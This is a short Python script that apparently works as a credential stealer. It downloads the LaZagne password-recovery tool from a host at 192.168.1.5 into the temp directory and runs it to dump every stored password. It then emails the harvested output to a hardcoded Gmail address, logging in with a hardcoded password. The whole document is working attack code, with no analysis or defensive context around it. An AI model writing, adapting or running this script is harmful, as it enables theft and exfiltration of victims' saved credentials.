#!/usr/bin/env python3

import subprocess
import tempfile
import requests
import smtplib
import os

def Download(resource):
    #
    filename = resource.split('/')
    #
    filename = filename[-1]
    #
    GetResponse = requests.get(resource) # Get Request for the URL #
    #
    # print("[*] Get Request: %s [*]" % GetResponse) # response.content - for content #
    #
    with open(str(filename),"wb") as output:
        #
        output.write(GetResponse.content)

def CommandExecute(cmd):
    #
    #subprocess.Popen(cmd, shell=True)
    #
    result = subprocess.check_output(cmd,shell=True)
    #
    return result

def SendMail(email,password,message):
    #
    server = smtplib.SMTP("smtp.gmail.com",587)
    #
    server.starttls()
    #
    server.login(email, password)
    #
    server.sendmail(email, email, message)
    #
    server.quit()

def main():
    #
    temp_dir = tempfile.gettempdir()
    #
    os.chdir(temp_dir)
    #
    Download("http://192.168.1.5/lazagne.exe")
    #
    result = subprocess.check_output("laZagne.exe all", shell=True)
    #
    SendMail("wolfgang.m.jager@gmail.com","deathanddestruction",result)

if(__name__ == '__main__'):
    #
    main()
